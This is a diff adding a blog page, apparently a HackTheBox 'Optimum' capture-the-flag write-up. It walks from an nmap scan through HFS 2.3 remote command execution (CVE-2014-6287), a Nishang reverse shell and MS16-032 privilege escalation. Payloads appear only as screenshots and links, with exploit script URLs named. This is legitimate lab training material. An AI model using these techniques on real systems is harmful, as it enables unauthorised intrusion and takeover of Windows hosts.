@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox - Optimum Writeup - SHAFIQAIMAN</title><meta name="Description" content="shafiqaiman.com is a cybersecurity/ethical hacking website that focus on publishing of writeup in HacktheBox, Tryhackme and other online CTF (capture the flag) challenge."><meta property="og:title" content="HackTheBox - Optimum Writeup" />
+<meta property="og:description" content="Nmap First, let’s scan the IP address by using the Nmap
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.92 scan initiated Fri Jun 10 19:25:32 2022 as: nmap -sC -sV -vv -p- --min-rate=10000 -oN nmap/optimum_all 10.10.10.8 Nmap scan report for 10.10.10.8 Host is up, received echo-reply ttl 127 (0.40s latency). Scanned at 2022-06-10 19:25:32 &#43;08 for 25s Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 127 HttpFileServer httpd 2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://shafiqaiman.com/posts/htb/optimum/" /><meta property="og:image" content="https://shafiqaiman.com/posts/htb/optimum/featured.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-06-17T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-06-17T00:00:00+00:00" /><meta property="og:site_name" content="SHAFIQAIMAN" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://shafiqaiman.com/posts/htb/optimum/featured.png"/>
+<meta name="twitter:title" content="HackTheBox - Optimum Writeup"/>
+<meta name="twitter:description" content="Nmap First, let’s scan the IP address by using the Nmap
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.92 scan initiated Fri Jun 10 19:25:32 2022 as: nmap -sC -sV -vv -p- --min-rate=10000 -oN nmap/optimum_all 10.10.10.8 Nmap scan report for 10.10.10.8 Host is up, received echo-reply ttl 127 (0.40s latency). Scanned at 2022-06-10 19:25:32 &#43;08 for 25s Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 127 HttpFileServer httpd 2."/>
+<meta name="application-name" content="SHAFIQAIMAN">
+<meta name="apple-mobile-web-app-title" content="SHAFIQAIMAN"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://shafiqaiman.com/posts/htb/optimum/" /><link rel="prev" href="https://shafiqaiman.com/posts/htb/jerry/" /><link rel="next" href="https://shafiqaiman.com/posts/htb/paper/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox - Optimum Writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/shafiqaiman.com\/posts\/htb\/optimum\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/shafiqaiman.com\/posts\/htb\/optimum\/featured.png",
+                            "width":  1400 ,
+                            "height":  1060 
+                        }],"genre": "posts","keywords": "CVE-2014-6287, CVE-2016-0099, MS16-032, rce, reverse-powershell, httpfileserver, HFS, empire-project, windows-sysnative, powershell-arc","wordcount":  938 ,
+        "url": "https:\/\/shafiqaiman.com\/posts\/htb\/optimum\/","datePublished": "2022-06-17T00:00:00+00:00","dateModified": "2022-06-17T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "SH∆FIQ ∆IM∆N"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i>  </a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i>  </a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i></a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i></a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox - Optimum Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://shafiqaiman.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>SH∆FIQ ∆IM∆N</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HacktheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="17-06-2022">17-06-2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;938 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/optimum/featured.png"
+        data-srcset="/posts/htb/optimum/featured.png, /posts/htb/optimum/featured.png 1.5x, /posts/htb/optimum/featured.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/optimum/featured.png"
+        title="/posts/htb/optimum/featured.png" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#nmap">Nmap</a></li>
+    <li><a href="#hfs-httpfileserver">HFS (HttpFileServer)</a>
+      <ul>
+        <li><a href="#cve-2014-6287">CVE-2014-6287</a></li>
+        <li><a href="#burpsuite">Burpsuite</a></li>
+      </ul>
+    </li>
+    <li><a href="#nishang-invoke-powershelltcpps1">Nishang: Invoke-PowerShellTcp.ps1</a>
+      <ul>
+        <li><a href="#ms16-032--cve-2016-0099">MS16-032 : CVE-2016-0099</a></li>
+        <li><a href="#empireproject-invoke-ms16032ps1">EmpireProject: Invoke-MS16032.ps1</a></li>
+        <li><a href="#windows-sysnative">Windows: sysnative</a></li>
+      </ul>
+    </li>
+    <li><a href="#windows-privilege-escalation">Windows: Privilege Escalation</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="nmap">Nmap</h2>
+<p>First, let’s scan the IP address by using the Nmap</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mi">7</span><span class="p">.</span><span class="mi">92</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">initiated</span><span class="w"> </span><span class="n">Fri</span><span class="w"> </span><span class="n">Jun</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">32</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">vv</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="c1">--min-rate=10000 -oN nmap/optimum_all 10.10.10.8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">8</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="p">,</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="n">echo</span><span class="o">-</span><span class="n">reply</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">127</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">40</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Scanned</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2022</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">10</span><span class="w"> </span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">32</span><span class="w"> </span><span class="o">+</span><span class="mi">08</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">25</span><span class="n">s</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Not</span><span class="w"> </span><span class="n">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65534</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="n">ports</span><span class="w"> </span><span class="p">(</span><span class="k">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PORT</span><span class="w">   </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="n">REASON</span><span class="w">          </span><span class="k">VERSION</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">127</span><span class="w"> </span><span class="n">HttpFileServer</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">Supported</span><span class="w"> </span><span class="n">Methods</span><span class="p">:</span><span class="w"> </span><span class="k">GET</span><span class="w"> </span><span class="n">HEAD</span><span class="w"> </span><span class="n">POST</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">HFS</span><span class="w"> </span><span class="o">/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">favicon</span><span class="p">:</span><span class="w"> </span><span class="k">Unknown</span><span class="w"> </span><span class="n">favicon</span><span class="w"> </span><span class="n">MD5</span><span class="p">:</span><span class="w"> </span><span class="mi">759792</span><span class="n">EDD4EF8E6BC2D1877D27153CB1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">HFS</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Read</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="k">from</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="k">share</span><span class="o">/</span><span class="n">nmap</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="n">done</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">Fri</span><span class="w"> </span><span class="n">Jun</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">57</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="c1">-- 1 IP address (1 host up) scanned in 24.94 seconds
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Interesting, the only port open is <code>80</code> and the banner says <code>HttpFileServer/HFS 2.3</code></p>
+<h2 id="hfs-httpfileserver">HFS (HttpFileServer)</h2>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>HTTP File Server</strong>, otherwise known as <code>HFS</code>, is a free web server specifically designed for publishing and sharing files. </br>
+It&rsquo;s different from classic file sharing because it uses web technology to be more compatible with today&rsquo;s Internet. <em>resource: <a href="https://en.wikipedia.org/wiki/HTTP_File_Server" target="_blank" rel="noopener noreffer ">wikipedia</a></em></div>
+        </div>
+    </div>
+<p>I navigate to the <code>port 80</code> through the web browser. WOW! it&rsquo;s just a simple webpage and its also can search files,? I believed. Well, this box is really old by the time I&rsquo;m writing this. Like always I&rsquo;m asking google about this information and waiting for the result to come in.</p>
+<p><figure><a class="lightgallery" href="/posts/htb/optimum/hfs-main-page.png" title="HFS webpage" data-thumbnail="/posts/htb/optimum/hfs-main-page.png" data-sub-html="<h2>HFS webpage</h2><p>HFS webpage</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/optimum/hfs-main-page.png"
+            data-srcset="/posts/htb/optimum/hfs-main-page.png, /posts/htb/optimum/hfs-main-page.png 1.5x, /posts/htb/optimum/hfs-main-page.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/optimum/hfs-main-page.png" width="1210" height="668" />
+    </a><figcaption class="image-caption">HFS webpage</figcaption>
+    </figure></p>
+<h3 id="cve-2014-6287">CVE-2014-6287</h3>
+<p>Upon searching on the internet. I found this <code>HFS</code> version is vulnerable to <code>RCE (remote command execution)</code> and got assigned to a <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6287" target="_blank" rel="noopener noreffer ">CVE-2014-6287</a>. I also found this <a href="https://www.kb.cert.org/vuls/id/251276" target="_blank" rel="noopener noreffer ">article</a> with a payload sample.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>CVE description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">The <code>findMacroMarker</code> function in <code>parserLib.pas</code> in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a <code>%00</code> sequence in a search action.</div>
+        </div>
+    </div>
+<h3 id="burpsuite">Burpsuite</h3>
+<p>I already have the <a href="https://www.kb.cert.org/vuls/id/251276" target="_blank" rel="noopener noreffer ">payload sample</a> and I&rsquo;m gonna try it out with simple command. The command is <code>whoami</code>. First, I intercept the <code>search</code> endpoint with <a href="https://portswigger.net/burp" target="_blank" rel="noopener noreffer ">burpsuite</a>. Then, send the request through the repeater and put the payload in the search query. However, it didn&rsquo;t display any output from my <code>whoami</code> command. Then, I remembered about the <code>ping</code> command. So, I try to ping myself to see, if I get the connection through the box.</p>
+<p><figure><a class="lightgallery" href="/posts/htb/optimum/burpsuite-search-ping.png" title="ping myself" data-thumbnail="/posts/htb/optimum/burpsuite-search-ping.png" data-sub-html="<h2>ping myself</h2><p>ping myself</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/optimum/burpsuite-search-ping.png"
+            data-srcset="/posts/htb/optimum/burpsuite-search-ping.png, /posts/htb/optimum/burpsuite-search-ping.png 1.5x, /posts/htb/optimum/burpsuite-search-ping.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/optimum/burpsuite-search-ping.png" width="844" height="466" />
+    </a><figcaption class="image-caption">ping myself</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/posts/htb/optimum/tcpdump-ping-tun0.png" title="receiving the ping request" data-thumbnail="/posts/htb/optimum/tcpdump-ping-tun0.png" data-sub-html="<h2>receiving the ping request</h2><p>receiving the ping request</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/optimum/tcpdump-ping-tun0.png"
+            data-srcset="/posts/htb/optimum/tcpdump-ping-tun0.png, /posts/htb/optimum/tcpdump-ping-tun0.png 1.5x, /posts/htb/optimum/tcpdump-ping-tun0.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/optimum/tcpdump-ping-tun0.png" width="998" height="384" />
+    </a><figcaption class="image-caption">receiving the ping request</figcaption>
+    </figure></p>
+<h2 id="nishang-invoke-powershelltcpps1">Nishang: Invoke-PowerShellTcp.ps1</h2>
+<p>The command runs successfully, with this information, I&rsquo;m gonna try to gain a foothold on the box with <a href="https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank" rel="noopener noreffer ">nishang</a> reverse shell script. Check this <a href="https://shafiqaiman.com/posts/htb/responder/#nishang-invoke-powershelltcpps1" target="_blank" rel="noopener noreffer ">blog</a>  where I configure the reverse shell script.</p>
+<p>First, I created a new directory called <code>www</code> and put the reverse shell script in the same directory. Then, I&rsquo;m hosting the <a href="https://www.python.org/downloads/" target="_blank" rel="noopener noreffer ">python</a> web server in port <code>80</code> and run the <code>nc</code> listener with <code>rlwrap</code> since this is a <code>Windows</code> machine. Back to the burpsuite, I use this <a href="https://shafiqaiman.com/posts/htb/responder/#nishang-invoke-powershelltcpps1" target="_blank" rel="noopener noreffer ">payload</a>, which is downloading the reverse shell script and executing it. <code>Don't forget the (dot) at the end</code>.</p>
+<p><figure><a class="lightgallery" href="/posts/htb/optimum/python3-server-and-nc-listening.png" title="serve python server" data-thumbnail="/posts/htb/optimum/python3-server-and-nc-listening.png" data-sub-html="<h2>serve python server</h2><p>serve python server</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/optimum/python3-server-and-nc-listening.png"
+            data-srcset="/posts/htb/optimum/python3-server-and-nc-listening.png, /posts/htb/optimum/python3-server-and-nc-listening.png 1.5x, /posts/htb/optimum/python3-server-and-nc-listening.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/optimum/python3-server-and-nc-listening.png" width="1887" height="476" />
+    </a><figcaption class="image-caption">serve python server</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/posts/htb/optimum/burpsuite-with-powershell-reverse-shell.png" title="execute reverse shell" data-thumbnail="/posts/htb/optimum/burpsuite-with-powershell-reverse-shell.png" data-sub-html="<h2>execute reverse shell</h2><p>execute reverse shell</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/optimum/burpsuite-with-powershell-reverse-shell.png"
+            data-srcset="/posts/htb/optimum/burpsuite-with-powershell-reverse-shell.png, /posts/htb/optimum/burpsuite-with-powershell-reverse-shell.png 1.5x, /posts/htb/optimum/burpsuite-with-powershell-reverse-shell.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/optimum/burpsuite-with-powershell-reverse-shell.png" width="930" height="492" />
+    </a><figcaption class="image-caption">execute reverse shell</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/posts/htb/optimum/nc-catch-the-shell.png" title="shell as kostas" data-thumbnail="/posts/htb/optimum/nc-catch-the-shell.png" data-sub-html="<h2>shell as kostas</h2><p>shell as kostas</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/optimum/nc-catch-the-shell.png"
+            data-srcset="/posts/htb/optimum/nc-catch-the-shell.png, /posts/htb/optimum/nc-catch-the-shell.png 1.5x, /posts/htb/optimum/nc-catch-the-shell.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/optimum/nc-catch-the-shell.png" width="950" height="437" />
+    </a><figcaption class="image-caption">shell as kostas</figcaption>
+    </figure></p>
+<p>NICE!. Finally, I&rsquo;m in as a <code>kostas</code> user. Since this is an old machine from <a href="https://app.hackthebox.com/" target="_blank" rel="noopener noreffer ">HacktheBox</a>, I&rsquo;m gonna assume they are plenty of exploits on the internet waiting to be found. Well, I&rsquo;m going to check this machine system with the <code>systeminfo</code> command first.</p>
+<p><figure><a class="lightgallery" href="/posts/htb/optimum/run-the-systeminfo-command.png" title="systeminfo" data-thumbnail="/posts/htb/optimum/run-the-systeminfo-command.png" data-sub-html="<h2>systeminfo</h2><p>systeminfo</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/optimum/run-the-systeminfo-command.png"
+            data-srcset="/posts/htb/optimum/run-the-systeminfo-command.png, /posts/htb/optimum/run-the-systeminfo-command.png 1.5x, /posts/htb/optimum/run-the-systeminfo-command.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/optimum/run-the-systeminfo-command.png" width="1028" height="431" />
+    </a><figcaption class="image-caption">systeminfo</figcaption>
+    </figure></p>
+<h3 id="ms16-032--cve-2016-0099">MS16-032 : CVE-2016-0099</h3>
+<p>This is a <code>Windows Server 2012R2</code> version <code>6.3.9600 N/A Build 9600</code> and the architecture type is <code>64 bit</code>. Upon searching this version on the net. I realize this version is vulnerable to a lot of things. However, I&rsquo;m gonna abuse the <a href="https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html" target="_blank" rel="noopener noreffer ">Secondary Logon Service</a> to gain the <code>SYSTEM</code> shell that is dubbed as <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032" target="_blank" rel="noopener noreffer ">MS16-032</a> or <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0099" target="_blank" rel="noopener noreffer ">CVE-2016-0099</a>.</p>
+<h3 id="empireproject-invoke-ms16032ps1">EmpireProject: Invoke-MS16032.ps1</h3>
+<p>I manage to find this <a href="https://www.exploit-db.com/exploits/39719" target="_blank" rel="noopener noreffer ">exploit</a> in the <a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreffer ">exploit-db</a>. However, the exploit itself didn&rsquo;t work in my case because it&rsquo;s open the <code>cmd</code> through <code>GUI</code> and I don&rsquo;t have access to the <code>GUI</code> instance. Luckily, I found the <a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1" target="_blank" rel="noopener noreffer ">powershell exploit</a> that allows me to privesc from the <a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener noreffer ">EmpireProject</a>.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>EmpireProject<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent. </br>
+It is the merge of the previous PowerShell Empire and Python EmPyre projects. </br>
+<em>resource: <a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener noreffer ">EmpireProject github</a></em></div>
+        </div>
+    </div>
+<p>So, I&rsquo;m gonna download it with the <code>wget</code> command. Then, edit the file by putting the <strong>example</strong> in the last line also edit the <code>URL</code> to point into my python server with another reverse shell called <code>yeet.ps1</code></p>
+<p><em>Note: the example start with <strong>Invoke-MS16-032</strong>. However, the function is named <strong>Invoke-MS16032</strong></em></p>
+<p><figure><a class="lightgallery" href="/posts/htb/optimum/download-ms16032-wget.png" title="download the exploit" data-thumbnail="/posts/htb/optimum/download-ms16032-wget.png" data-sub-html="<h2>download the exploit</h2><p>download the exploit</p>">
+        <img
